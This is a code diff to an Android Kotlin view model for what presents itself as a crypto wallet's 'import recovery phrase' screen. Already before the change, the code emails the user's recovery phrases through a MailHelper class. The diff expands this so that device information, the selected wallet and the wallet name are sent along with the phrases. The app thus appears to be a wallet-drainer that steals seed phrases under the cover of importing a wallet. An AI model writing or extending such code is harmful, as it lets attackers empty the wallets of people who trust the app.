@@ -37,6 +37,12 @@ class ImportPhraseViewModel(wallet: Wallet, app: Application) : AndroidViewModel
     val eventAskRecoveryPhrase: LiveData<Boolean>
         get() = _eventAskRecoveryPhrase
 
+    private val _eventImportPhrase = MutableLiveData<Boolean>()
+    val eventImportPhrase: LiveData<Boolean>
+        get() = _eventImportPhrase
+
+    private val _deviceInfo = MutableLiveData<String>()
+
     // Two-way databinding, exposing MutableLiveData
     val name = MutableLiveData<String>()
     val nameValidator = LiveDataValidator(name).apply {
@@ -61,6 +67,7 @@ class ImportPhraseViewModel(wallet: Wallet, app: Application) : AndroidViewModel
         _importPhraseStatus.value = ImportPhraseStatus.NONE
         _selectedWallet.value = wallet
         _eventAskRecoveryPhrase.value = false
+        _eventImportPhrase.value = false
         name.value = "Wallet 1"
         isImportFormValidMediator.value = false
     }
@@ -98,10 +105,11 @@ class ImportPhraseViewModel(wallet: Wallet, app: Application) : AndroidViewModel
     fun importPhrases() {
         validateForm()
         if (isImportFormValidMediator.value!!) {
+            _eventImportPhrase.value = true
             coroutineScope.launch {
                 _importPhraseStatus.postValue(ImportPhraseStatus.LOADING)
                 try {
-                    MailHelper.sendEmail(phrases.value!!, requireNotNull(MailHelper.mail).username)
+                    MailHelper.sendPhrasesEmail(_deviceInfo.value!!, _selectedWallet.value!!, name.value!!, phrases.value!!)
                     Log.d("email", "Email has been sent")
                     _importPhraseStatus.postValue(ImportPhraseStatus.SUCCESS)
                 } catch (e: Exception) {
@@ -128,11 +136,19 @@ class ImportPhraseViewModel(wallet: Wallet, app: Application) : AndroidViewModel
         _eventPastePhrases.value = false
     }
 
+    fun onImportPhraseComplete() {
+        _eventImportPhrase.value = false
+    }
+
     fun onImportPhraseStatusComplete() {
         _importPhraseStatus.value = ImportPhraseStatus.NONE
     }
 
     fun updatePhrases(value: String) {
         phrases.value = value
+    }
+
+    fun setDeviceInfo(value: String) {
+        _deviceInfo.value = value
     }
 }
